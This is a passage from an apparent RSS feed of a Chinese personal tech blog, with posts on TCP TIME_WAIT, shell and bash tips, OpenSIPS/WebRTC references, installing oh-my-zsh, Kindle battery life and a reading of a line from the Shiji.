&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://nginx.org/en/docs/http/ngx_http_headers_module.html&#34;&gt;http://nginx.org/en/docs/http/ngx_http_headers_module.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.hxs.biz/html/20180425122255.html&#34;&gt;http://www.hxs.biz/html/20180425122255.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://blog.csdn.net/xiojing825/article/details/83383524&#34;&gt;https://blog.csdn.net/xiojing825/article/details/83383524&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://cloud.tencent.com/developer/article/1470375&#34;&gt;https://cloud.tencent.com/developer/article/1470375&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://blog.csdn.net/bbg221/article/details/79886979&#34;&gt;https://blog.csdn.net/bbg221/article/details/79886979&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>kindle阅读器的寿命</title>
      <link>https://wdd.js.org/posts/2020/02/amkcs2/</link>
      <pubDate>Tue, 04 Feb 2020 09:12:29 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/02/amkcs2/</guid>
      <description>&lt;p&gt;2018年1月26日，我在京东上买了一个Kindle Paperwhite, 距离今天，大概已经2年多一点了。&lt;/p&gt;
&lt;p&gt;我是一个重度读者，每天都会花上一些时间去阅读。最近两天发现，本来可以连续两周不用充电的kindle。基本上现在是电量以每天50%的速度减少。或许，2年，就是kindle的寿命。&lt;/p&gt;
&lt;p&gt;刚开始读书总觉得没有什么进度，后来我就喜欢把每天读书的进度给记录下来。这样做的好处是能够督促我不要偷懒，&lt;/p&gt;
&lt;p&gt;我读书有个习惯，每天以至少1%的进度去读一本书，并且我会将进度记录下来。基本上，我每天会读7-8本书的1%。&lt;/p&gt;
&lt;p&gt;两年时间内我读过的书，要比我从小学到大学读过的书都要多。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2020/02/amkcs2/2022-10-29-19-37-57.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>TIME_WAIT与持久连接</title>
      <link>https://wdd.js.org/network/sq4l53/</link>
      <pubDate>Wed, 15 Jan 2020 20:23:45 +0800</pubDate>
      <guid>https://wdd.js.org/network/sq4l53/</guid>
      <description>&lt;p&gt;在事务结束之后，仍然保持在打开状态的链接称为持久连接。非持久的链接会在每个事务结束之后就会关闭。&lt;/p&gt;
&lt;h1 id=&#34;持久连接的好处&#34;&gt;持久连接的好处 &lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;避免缓慢的链接建立阶段&lt;/li&gt;
&lt;li&gt;避免慢启动的拥塞适应阶段&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;keep-alive&#34;&gt;Keep-Alive&lt;/h1&gt;
&lt;p&gt;客户端发起请求，带有Connection: Keep-Alive头。客户端在响应头中回应Connection: Keep-Alive。则说明客户端同意持久连接。&lt;/p&gt;
&lt;p&gt;如果客户端不同意持久连接，就会在响应头中返回Connection: Close&lt;/p&gt;
&lt;p&gt;注意事项&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;即使服务端同意了持久连接，服务端也可以随时关闭连接&lt;/li&gt;
&lt;li&gt;HTTP 1.0 协议，必须显式传递Connection: Keep-Alive，服务端才会激活持久连接&lt;/li&gt;
&lt;li&gt;HTTP 1.1 协议，默认就是持久连接&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/network/sq4l53/2022-10-29-18-37-07.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;在通信双方中，主动关闭连接的一方会进入TIME_WIAT状态，而被动关闭的一方则不会进入该状态。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/network/sq4l53/2022-10-29-18-37-20.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;time_wait连接太多&#34;&gt;TIME_WAIT连接太多&lt;/h1&gt;
&lt;p&gt;服务端太多的TIME_WAIT连接，则说明连接是服务端主动去关闭的。查看了响应头，内容也是Connection: Close。&lt;/p&gt;
&lt;p&gt;我们知道，一般情况下TIME_WAIT状态的链接至少会持续60秒。也就是说该连接占用的内存至少在60秒内不会释放。&lt;/p&gt;
&lt;p&gt;当连接太多时，就有可能产生out of memory的问题，而操作系统就会很有可能把这个进程给kill掉，进而导致服务不可用。&lt;/p&gt;</description>
    </item>
    <item>
      <title>论禹三过家门而不入的真实原因</title>
      <link>https://wdd.js.org/posts/2020/01/encss4/</link>
      <pubDate>Thu, 09 Jan 2020 13:43:47 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/01/encss4/</guid>
      <description>&lt;p&gt;最早听说“三过家门而不入”，是说禹治水大公无私，路过家门都没有回家。&lt;/p&gt;
&lt;p&gt;最近看到史记，发现这句话原本是&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;禹伤先人父鲧(发音和滚相同)功之不成受诛，乃劳身焦思，居外十三年，过家门不敢入&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;&amp;ldquo;三过家门而不入&amp;quot;这个短语中, 与原文少一个“敢”字，少了一个字，含义差距很大。&lt;/p&gt;
&lt;p&gt;没有敢字，说明是自己主动的。加上敢字，则会让人思考。&lt;strong&gt;禹为什么不敢回家？他在怕什么呢？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这里就需要提到禹的父亲鲧。&lt;/p&gt;
&lt;p&gt;鲧治水九年，没有把水治理好。在舜巡视的时候，被赐死在羽山。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;舜登用，摄行天子之政，巡狩。行视鲧之治水无状，乃殛（发音和即相同）鲧于羽山以死&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;所以，如果禹治不好水，你想禹的下场是什么？&lt;/p&gt;</description>
    </item>
    <item>
      <title>漫话TCP TIME-WAIT状态【ing】</title>
      <link>https://wdd.js.org/network/yoc1k0/</link>
      <pubDate>Tue, 07 Jan 2020 22:48:37 +0800</pubDate>
      <guid>https://wdd.js.org/network/yoc1k0/</guid>
      <description>&lt;p&gt;在《tcp/ip详解卷一》中，有幅图介绍了TCP的状态迁移，TCP的状态转移并不简单，我们本次重点关注TIME_WAIT状态。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/network/yoc1k0/2022-10-29-18-37-39.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;time-wait&#34;&gt;TIME-WAIT&lt;/h1&gt;
&lt;p&gt;主机1发起FIN关闭连接请求，主机2发送ACK确认，然后也发送FIN。主机1在收到FIN之后，想主机2发送了ACK。&lt;/p&gt;
&lt;p&gt;在主机1发送ACK时，主机1就进入了TIME-WAIT状态。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;主动发起关闭连接的一方会有TIME-WAIT状态&lt;/li&gt;
&lt;li&gt;如果两方同时发起关闭连接请求，那么两方都会进入TIME-WAIT状态&lt;/li&gt;
&lt;li&gt;TIME-WAIT的时长在 &lt;code&gt;/proc/sys/net/ipv4/tcp_fin_timeout&lt;/code&gt; 中配置，一般是60s&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/network/yoc1k0/2022-10-29-18-37-49.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;为什么要有time-wait状态&#34;&gt;为什么要有TIME-WAIT状态？&lt;/h1&gt;
&lt;h1 id=&#34;太多time-wait链接是否意味有故障&#34;&gt;太多TIME-WAIT链接是否意味有故障？&lt;/h1&gt;</description>
    </item>
    <item>
      <title>常用shell技巧</title>
      <link>https://wdd.js.org/shell/all-in-one/</link>
      <pubDate>Tue, 07 Jan 2020 00:00:00 +0800</pubDate>
      <guid>https://wdd.js.org/shell/all-in-one/</guid>
      <description>&lt;h1 id=&#34;命令行编辑&#34;&gt;命令行编辑&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;向左移动光标	ctrl + b&lt;/li&gt;
&lt;li&gt;向右移动光标	ctrl + f&lt;/li&gt;
&lt;li&gt;移动光标到行尾	ctrl + e&lt;/li&gt;
&lt;li&gt;移动光标到行首	ctrl + a&lt;/li&gt;
&lt;li&gt;清除前面一个词	ctrl + w&lt;/li&gt;
&lt;li&gt;清除光标到行首	ctrl + u&lt;/li&gt;
&lt;li&gt;清除光标到行尾	ctrl + k&lt;/li&gt;
&lt;li&gt;命令行搜索	ctrl + r&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;解压与压缩&#34;&gt;解压与压缩&lt;/h1&gt;
&lt;p&gt;1、压缩命令：
命令格式：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;tar -zcvf 压缩文件名 .tar.gz 被压缩文件名
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可先切换到当前目录下，压缩文件名和被压缩文件名都可加入路径。&lt;/p&gt;
&lt;p&gt;2、解压缩命令：
命令格式：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;tar -zxvf 压缩文件名.tar.gz
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;解压缩后的文件只能放在当前的目录。&lt;/p&gt;
&lt;h1 id=&#34;crontab-每隔x秒执行一次&#34;&gt;crontab 每隔x秒执行一次&lt;/h1&gt;
&lt;p&gt;每隔5秒&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;* * * * * for i in {1..12}; do /bin/cmd -arg1 ; sleep 5; done
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;每隔15秒&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;* * * * * /bin/cmd -arg1
* * * * * sleep 15; /bin/cmd -arg1
* * * * * sleep 30; /bin/cmd -arg1
* * * * * sleep 45; /bin/cmd -arg1
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;awk从第二行开始读取&#34;&gt;awk从第二行开始读取&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;awk &amp;#39;NR&amp;gt;2{print $1}&amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;查找大文件并清空文件内容&#34;&gt;查找大文件，并清空文件内容&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;find /var/log -type f -size +1M -exec truncate --size 0 &amp;#39;{}&amp;#39; &amp;#39;;&amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;switch-case-语句&#34;&gt;switch case 语句&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;echo &amp;#39;Input a number between 1 to 4&amp;#39;
echo &amp;#39;Your number is:\c&amp;#39;
read aNum
case $aNum in
    1)  echo &amp;#39;You select 1&amp;#39;
    ;;
    2)  echo &amp;#39;You select 2&amp;#39;
    ;;
    3)  echo &amp;#39;You select 3&amp;#39;
    ;;
    4)  echo &amp;#39;You select 4&amp;#39;
    ;;
    *)  echo &amp;#39;You do not select a number between 1 to 4&amp;#39;
    ;;
esac
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;以开头的特殊变量&#34;&gt;以$开头的特殊变量&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;echo $$ # 进程pid
echo $# # 收到的参数个数
echo $@ # 列表方式的参数 $1 $2 $3
echo $? # 上个进程的退出码
echo $* # 类似列表方式，但是参数被当做一个实体, &amp;#34;$1c$2c$3&amp;#34; c是IFS的第一个字符
echo $0 # 脚本名
echo $1 $2 $3 # 第一、第二、第三个参数

for i in $@
do
  echo $i
done

for j in $@
do
  echo $j
done
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;判断git仓库是否clean&#34;&gt;判断git仓库是否clean&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;check_is_repo_clean () {
       if [ -n &amp;#34;$(git status --porcelain)&amp;#34; ]; then
           echo &amp;#34;Working directory is not clean&amp;#34;
           exit 1
       fi
}
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;文件批处理-for-in循环&#34;&gt;文件批处理 for in循环&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;for f in *.txt; do mv $f $f.gz; done
for d in *.gz; do gunzip $d; done
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;shell-重定向到devnull&#34;&gt;shell 重定向到/dev/null&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ls &amp;amp;&amp;gt;/dev/null; #标准错误和标准输出都不想看
ls 1&amp;gt;/dev/null; #不想看标准输出
ls 2&amp;gt;/dev/null; 标准错误不想看
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;sed--e-expression-1-char-21-unknown-option-to-s&#34;&gt;sed: -e expression #1, char 21: unknown option to `s&#39;&lt;/h1&gt;
&lt;p&gt;出现这个问题，一般是要替换的字符串中也有/符号，所以要把分隔符改成 ! 或者 |&lt;/p&gt;</description>
    </item>
    <item>
      <title>opensips 与 webrtc资料整理</title>
      <link>https://wdd.js.org/opensips/ch9/webrtc-pdf/</link>
      <pubDate>Tue, 31 Dec 2019 09:25:42 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch9/webrtc-pdf/</guid>
      <description>&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.opensips.org/Documentation/Tutorials-WebSocket-2-2&#34;&gt;https://www.opensips.org/Documentation/Tutorials-WebSocket-2-2&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://opensips.org/pub/events/2016-05-10_OpenSIPS-Summit_Amsterdam/Pete_Kelly-OpenSIPS_Summit2016-OpenSIPSandWebRTC.pdf&#34;&gt;https://opensips.org/pub/events/2016-05-10_OpenSIPS-Summit_Amsterdam/Pete_Kelly-OpenSIPS_Summit2016-OpenSIPSandWebRTC.pdf&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;pdf附件&#34;&gt;pdf附件&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;./Eric_Tamme-OpenSIPS_Summit_Austin_2015-WebRTC_with_OpenSIPS.pdf&#34;&gt;Eric_Tamme-OpenSIPS_Summit_Austin_2015-WebRTC_with_OpenSIPS.pdf&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;./Pete_Kelly-OpenSIPS_Summit2016-OpenSIPSandWebRTC.pdf&#34;&gt;Pete_Kelly-OpenSIPS_Summit2016-OpenSIPSandWebRTC.pdf&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>手工安装oh-my-zsh</title>
      <link>https://wdd.js.org/shell/manu-install-ohmyzsh/</link>
      <pubDate>Fri, 27 Dec 2019 09:29:41 +0800</pubDate>
      <guid>https://wdd.js.org/shell/manu-install-ohmyzsh/</guid>
      <description>&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;yum install zsh -y
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# github上的项目下载太慢，所以我就把项目克隆到gitee上，这样克隆速度就非常快&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git clone https://gitee.com/nuannuande/oh-my-zsh.git ~/.oh-my-zsh
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 这一步是可选的&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cp ~/.zshrc ~/.zshrc.orig
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 这一步是必须的&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cp ~/.oh-my-zsh/templates/zshrc.zsh-template ~/.zshrc
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 改变默认的sh, 如果这一步报错，就再次输入 zsh&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;chsh -s &lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;which zsh&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>m4读取环境变量</title>
      <link>https://wdd.js.org/shell/m4-env/</link>
      <pubDate>Fri, 27 Dec 2019 09:28:53 +0800</pubDate>
      <guid>https://wdd.js.org/shell/m4-env/</guid>
      <description>&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;define&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;CF_INNER_IP&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;, `esyscmd(`printf &amp;#34;$PWD&amp;#34;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>pure-bash-bible</title>
      <link>https://wdd.js.org/shell/pure-bash-bible/</link>
      <pubDate>Thu, 26 Dec 2019 13:46:31 +0800</pubDate>
      <guid>https://wdd.js.org/shell/pure-bash-bible/</guid>
      <description>&lt;h1 id=&#34;字符串&#34;&gt;字符串&lt;/h1&gt;
&lt;h2 id=&#34;字符串包含&#34;&gt;字符串包含&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Using a test:&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[[&lt;/span&gt; $var &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; *sub_string* &lt;span style=&#34;color:#f92672&#34;&gt;]]&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    printf &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;%s\n&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sub_string is in var.&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Inverse (substring not in string).&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[[&lt;/span&gt; $var !&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; *sub_string* &lt;span style=&#34;color:#f92672&#34;&gt;]]&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    printf &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;%s\n&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sub_string is not in var.&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# This works for arrays too!&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[[&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;arr[*]&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; *sub_string* &lt;span style=&#34;color:#f92672&#34;&gt;]]&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    printf &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;%s\n&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sub_string is in array.&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Using a case statement:&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; in
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    *sub_string*&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;# Do stuff&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    *sub_string2*&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;# Do more stuff&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    *&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;# Else&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;esac&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;字符串开始&#34;&gt;字符串开始&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[[&lt;/span&gt; $var &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; sub_string* &lt;span style=&#34;color:#f92672&#34;&gt;]]&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    printf &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;%s\n&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;var starts with sub_string.&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Inverse (var does not start with sub_string).&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[[&lt;/span&gt; $var !&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; sub_string* &lt;span style=&#34;color:#f92672&#34;&gt;]]&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    printf &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;%s\n&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;var does not start with sub_string.&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;字符串结尾&#34;&gt;字符串结尾&lt;/h2&gt;
